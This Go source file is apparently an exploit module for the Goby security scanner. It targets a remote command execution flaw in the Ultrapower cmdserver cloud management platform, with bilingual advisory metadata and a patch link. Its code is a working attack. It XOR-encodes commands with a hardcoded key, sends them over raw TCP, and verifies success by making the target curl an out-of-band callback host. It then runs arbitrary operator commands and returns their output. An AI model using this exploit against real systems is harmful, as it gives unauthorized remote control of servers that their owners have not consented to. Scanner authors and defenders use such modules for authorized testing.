package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net"
	"time"
)

func init() {
	expJson := `{
    "Name": "ultrapower cmdserver cloud management platform remote command execution",
    "Description": "<p>There is a remote command execution vulnerability in the Shenzhou Taiyue cmdserver cloud management platform, and attackers can implement command execution by constructing special network requests to control the entire web server..</p><p>Affected versions are versions before 2020.</p>",
    "Impact": "ultrapower cmdserver cloud management platform remote command execution",
    "Recommendation": "<p> The manufacturer has released an upgrade patch to fix this security issue, patch access link：https://www.ultrapower.com.cn/portal/ultraWeb.action</p>",
    "Product": "cmdserver",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "神州泰岳 cmdserver 云管理平台远程命令执行",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">神州泰岳cmdserver云管理平台存在远程命令执行漏洞，攻击者可通过构造特殊网络请求实现命令执行，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">进而控制整个web服务器</span>。</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">受影响版本为2020年之前版本</span></p>",
            "Impact": "<p>攻击者可通过构造特殊网络请求实现命令执行，进而控制整个web服务器。</p><p>受影响版本为2020年之前版本。</p>",
            "Recommendation": "<p>厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：<a href=\"https://www.ultrapower.com.cn/portal/ultraWeb.action\">https://www.ultrapower.com.cn/portal/ultraWeb.action</a><br></p>",
            "Product": "cmdserver",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "ultrapower cmdserver cloud management platform remote command execution",
            "Description": "<p>There is a remote command execution vulnerability in the Shenzhou Taiyue cmdserver cloud management platform, and attackers can implement command execution by constructing special network requests <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">to control the entire web server.</span>.</p><p>Affected versions are versions before 2020.</p>",
            "Impact": "ultrapower cmdserver cloud management platform remote command execution",
            "Recommendation": "<p>&nbsp;The manufacturer has released an upgrade patch to fix this security issue, patch access link：<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.ultrapower.com.cn/portal/ultraWeb.action\">https://www.ultrapower.com.cn/portal/ultraWeb.action</a></span><br></p>",
            "Product": "cmdserver",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"神州泰岳\"",
    "GobyQuery": "body=\"神州泰岳\"",
    "Author": "twcjw",
    "Homepage": "https://www.ultrapower.com.cn",
    "DisclosureDate": "2022-06-20",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10473"
}`

	parsecmd5af4 := func(cmd, key string) []byte {
		keyCa := []byte(key)
		cmdCa := []byte(cmd)
		for i, _ := range cmdCa {
			if i == len(cmdCa)-1 {
				continue
			}
			cmdCa[i] ^= keyCa[i%len(keyCa)]
		}
		return cmdCa
	}
	writeByte2fca := func(conn net.Conn, by []byte) error {
		log.Printf("%#v\n", by)
		_, err := conn.Write(by)
		if err != nil {
			log.Println(err)
		}
		return err
	}
	readByte2fca := func(conn net.Conn) ([]byte, error) {
		b1 := make([]byte, 128)
		i, err := conn.Read(b1)
		if err != nil {
			log.Println(err)
		}
		return b1[:i], err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			key := "0bb6d509-9c1a-46dc-aaec-e010003964ae"
			cmdBytes := parsecmd5af4(cmd, key)
			conn, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return false
			}
			err = writeByte2fca(conn, []byte(fmt.Sprintf("%s%d", "00000000", len(cmdBytes))))
			if err != nil {
				return false
			}
			err = writeByte2fca(conn, cmdBytes)
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			key := "0bb6d509-9c1a-46dc-aaec-e010003964ae"
			cmdbytes := parsecmd5af4(cmd, key)
			conn, _ := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			writeByte2fca(conn, []byte(fmt.Sprintf("%s%d", "00000000", len(cmdbytes))))
			writeByte2fca(conn, cmdbytes)
			fca, _ := readByte2fca(conn)
			conn.Close()
			result := string(parsecmd5af4(string(fca), key))
			if result != "" {
				expResult.Success = true
				expResult.Output = result
			} else {
				expResult.Success = false
				expResult.Output = "Automatic exploitation failed, please try manual exploitation"
			}
			return expResult
		},
	))
}
